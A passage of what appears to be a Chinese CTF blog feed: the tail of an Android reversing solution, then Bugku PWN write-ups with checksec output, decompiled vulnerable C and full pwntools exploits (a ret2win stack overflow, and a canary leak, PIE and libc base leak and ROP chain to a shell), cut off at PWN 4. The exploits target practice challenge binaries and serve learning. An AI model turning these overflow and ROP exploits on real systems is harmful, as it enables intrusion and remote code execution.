class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.getMenuInflater().inflate(<span class="number">2131558400</span>, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> v1 = item.getItemId() == <span class="number">2131492961</span> ? <span class="keyword">true</span> : <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI2</span><span class="params">(<span class="keyword">int</span> arg1)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过分析可知重要的<strong>chec</strong>和<strong>stringFromJNI2</strong>都在<strong>native</strong>层，那么就需要将<strong>liblhm.so</strong>文件载入<strong>IDA</strong>进行分析，载入后直接<strong>shift+F12</strong>搜索字符串双击<strong>MainActivity</strong>进入，接着找到引用</p><p>在按<strong>F5</strong>就可以将<strong>chec</strong>反汇编成伪代码了 经过分析 可以知道<strong>chec</strong>方法根据第二个参数乘2对3取模的结果调用<strong>Java</strong>层的三个<strong>check</strong>函数对我们的输入进行处理所以我们只需要写脚本将算法逆过来就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinput</span><span class="params">()</span>:</span></span><br><span class="line">    target = <span class="number">1835996258</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">2</span> * i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            target = check1(target,i - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">2</span> * i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            target = check2(target,i - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            target = check3(target,i - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> target</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check1</span><span class="params">(input,loopNum)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        t = t - i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check3</span><span class="params">(input,loopNum)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        t = t - i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span><span class="params">(input, loopNum)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">if</span> loopNum % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">            t -= i</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        t += i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  getinput()</span><br></pre></td></tr></table></figure><p>得到答案：<strong>alictf{Jan6N100p3r}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-PWN</title>
      <link href="/2019/10/05/Bugku-PWN/"/>
      <url>/2019/10/05/Bugku-PWN/</url>
      
        <content type="html"><![CDATA[<h2 id="PWN-1"><a href="#PWN-1" class="headerlink" title="PWN 1"></a>PWN 1</h2><p>没啥好说直接nc上去cat flag就是了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~$ nc 114.116.54.89 10001</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">helloworld</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">cat flag</span><br><span class="line">flag&#123;6979d853add353c9&#125;</span><br></pre></td></tr></table></figure><h2 id="PWN-2"><a href="#PWN-2" class="headerlink" title="PWN 2"></a>PWN 2</h2><p>先检查一下文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn2$ checksec pwn2</span><br><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn2/pwn2'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>直接拿IDA Pro打开反汇编一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"say something?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"oh,that's so boring!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现栈只开了0x30的大小，却可以读取0x100个字符，存在明显的栈溢出漏洞，然后发现一个getshell函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_shell_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tql~tql~tql~tql~tql~tql~tql"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"this is your flag!"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显只要我们劫持path到这里就完事了，十分容易</p><p>接下来直接给exp吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./pwn2")</span></span><br><span class="line">p = remote(<span class="string">'114.116.54.89 '</span>, <span class="number">10003</span>)</span><br><span class="line">getshell = <span class="number">0x400751</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x38</span>+p64(getshell)</span><br><span class="line">p.recvuntil(<span class="string">'say something?\n'</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Closed connection to 114.116.54.89  port 10003</span><br><span class="line">oh,that's so boring!</span><br><span class="line">tql~tql~tql~tql~tql~tql~tql</span><br><span class="line">this is your flag!</span><br><span class="line">flag&#123;n0w_y0u_kn0w_the_Stack0verfl0w&#125;</span><br></pre></td></tr></table></figure><h2 id="PWN-3"><a href="#PWN-3" class="headerlink" title="PWN 3"></a>PWN 3</h2><p>先检查一下文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn3/read_note'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>防护全开，十分厉害的样子，直接拿IDA Pro打开反汇编一下，没有<strong>system</strong>，需要用<strong>libc</strong>构造<strong>shell</strong>，有<strong>canary</strong>保护，需要读<strong>canary</strong>的值，随机地址，需要读程序基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> note_len; <span class="comment">// [rsp+4h] [rbp-4ECh]</span></span><br><span class="line">  FILE *fp; <span class="comment">// [rsp+8h] [rbp-4E8h]</span></span><br><span class="line">  <span class="keyword">char</span> fpath[<span class="number">20</span>]; <span class="comment">// [rsp+10h] [rbp-4E0h]</span></span><br><span class="line">  <span class="keyword">char</span> memory[<span class="number">600</span>]; <span class="comment">// [rsp+30h] [rbp-4C0h]</span></span><br><span class="line">  <span class="keyword">char</span> thinking_note[<span class="number">600</span>]; <span class="comment">// [rsp+290h] [rbp-260h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+4E8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(memory, <span class="number">0</span>, <span class="number">0x258</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(fpath, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(thinking_note, <span class="number">0</span>, <span class="number">0x258</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to noteRead system"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"there is there notebook: flag, flag1, flag2"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  Please input the note path:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, fpath, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( fpath[<span class="built_in">strlen</span>(fpath) - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">    fpath[<span class="built_in">strlen</span>(fpath) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(fpath) &gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"note path false!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fp = fopen(fpath, <span class="string">"r"</span>);</span><br><span class="line">    noteRead(fp, memory, <span class="number">0x244</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(memory);</span><br><span class="line">    fclose(fp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"write some note:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  please input the note len:"</span>);</span><br><span class="line">  note_len = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;note_len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input the note:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, thinking_note, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)note_len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"the note is: "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(thinking_note);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(thinking_note) != <span class="number">624</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"error: the note len must be  624"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"  so please input note(len is 624)"</span>);</span><br><span class="line">    read(<span class="number">0</span>, thinking_note, <span class="number">0x270</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">noteRead</span><span class="params">(FILE *fp, <span class="keyword">char</span> *arg_buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fread(arg_buf, arg_len, <span class="number">1u</span>LL, fp);</span><br><span class="line">  len = <span class="built_in">strlen</span>(arg_buf);</span><br><span class="line">  <span class="keyword">if</span> ( arg_buf[len - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">    arg_buf[len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过观察，<strong>thinking_note</strong>是存在栈溢出漏洞的，且<strong>notelen</strong>我们可以控制的。利用<strong>thinking_note</strong>进行栈溢出，每次利用第一个<strong>read</strong>和<strong>puts</strong>获取一个值，第二个<strong>read</strong>恢复栈并跳回<strong>main</strong>函数进行下次攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">memset(thinking_note, 0, 0x258uLL);</span><br><span class="line">__isoc99_scanf(&quot;%d&quot;, &amp;note_len);</span><br><span class="line">read(0, thinking_note, (unsigned int)note_len);</span><br><span class="line">read(0, thinking_note, 0x270uLL);</span><br></pre></td></tr></table></figure><p>因为这题存在Canary保护，故第一次肯定为泄露Canary的值，观察下列汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000000</span>AA0                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000000</span>AA1                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000000</span>AA4                 sub     rsp, <span class="number">4F</span>0h</span><br><span class="line">.text:<span class="number">0000000000000</span>AAB                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>AB4                 mov     [rbp<span class="number">-8</span>], rax</span><br><span class="line">.text:<span class="number">0000000000000</span>AB8                 xor     eax, eax</span><br></pre></td></tr></table></figure><p>我们不难得出若要泄露<strong>Canary</strong>地址应构造：<strong>“A” * 0x258</strong>，<strong>Canary</strong>的最低位通常是<strong>0x00</strong>，所以要将其覆盖（<strong>puts</strong>函数遇到<strong>0x00</strong>会停止），故最后应构造： <strong>“A” * 0x258+”B”</strong></p><p>通过查看IDA可知<strong>main</strong>函数的相对地址为<strong>0x0D20</strong>，因为当<strong>vul</strong>函数执行完毕后需要回到<strong>main</strong>函数，故栈中最后的反回地址应该是<strong>0x0D2E</strong>，故第二次将Canary的值写到对应位置，继续覆盖，最低位变为<strong>0x20</strong>，最后的返回地址从<strong>0D2E</strong>变为<strong>0D20</strong>，这样程序就能返回到<strong>main</strong>函数</p><p>第二步读取<strong>vul</strong>的返回地址，第一次写栈到<strong>ebp+8</strong>(<strong>canary</strong>要仍要写到<strong>var_8</strong>对应的位置)，读到返回地址，然后减去<strong>0xD2E</strong>(<strong>IDA</strong>中看到的<strong>vul</strong>的返回地址)</p><p>第三步读取<strong>libc</strong>基址,<strong>libc</strong>基址根据<strong>main</strong>函数的返回地址计算,<strong>main</strong>函数在<strong>call vul</strong>之前只有<strong>push rbp</strong>会影响栈，而我们在前两步分别多执行了一次<strong>push rbp</strong>，所以一共是执行了<strong>三</strong>次，那么现在<strong>main</strong>函数返回地址的位置应该和<strong>vul</strong>函数返回地址的位置相差<strong>0x8*4</strong>，也就是<strong>ebp+0x28</strong></p><p>故Exp最终如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"114.116.54.89"</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">val_add = <span class="number">0xd2e</span></span><br><span class="line">pop_rdi_add = <span class="number">0xe03</span></span><br><span class="line">puts_plt_add = <span class="number">0x8b0</span></span><br><span class="line">puts_got_add = <span class="number">0x202018</span></span><br><span class="line">start_add = <span class="number">0xd20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>)+<span class="string">"B"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"B"</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"cancay:"</span>, hex(canary)</span><br><span class="line">x = p.recvline()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"\x20"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span>+<span class="number">7</span>)+<span class="string">"B"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"B"</span>)</span><br><span class="line">x = p.recvline()</span><br><span class="line">val = u64(x[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"val:"</span>, hex(val)</span><br><span class="line">elf_base = val - val_add</span><br><span class="line"><span class="keyword">print</span> hex(elf_base)</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"\x20"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_plt = elf_base + puts_plt_add</span><br><span class="line">puts_got = elf_base + puts_got_add</span><br><span class="line">pop_rdi = elf_base + pop_rdi_add</span><br><span class="line">start = elf_base + start_add</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span> + <span class="number">8</span>*<span class="number">5</span><span class="number">-1</span>)+<span class="string">"B"</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"B"</span>)</span><br><span class="line">x = p.recvuntil(<span class="string">"please"</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">start_abs = u64(x[:<span class="number">8</span>].split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc_base = start_abs - <span class="number">0x20830</span></span><br><span class="line"><span class="keyword">print</span> hex(start_abs)</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">bin_add = <span class="number">0x18cd57</span></span><br><span class="line">sys_add = <span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line">bin_abs = libc_base + bin_add</span><br><span class="line">sys_abs = libc_base + sys_add</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"path:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * (<span class="number">0x260</span><span class="number">-8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_abs)</span><br><span class="line">payload += p64(sys_abs)</span><br><span class="line">payload += p64(start)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN-4"><a href="#PWN-4" class="headerlink" title="PWN 4"></a>PWN 4</h2><p>先检查一下文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn4/pwn4'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX 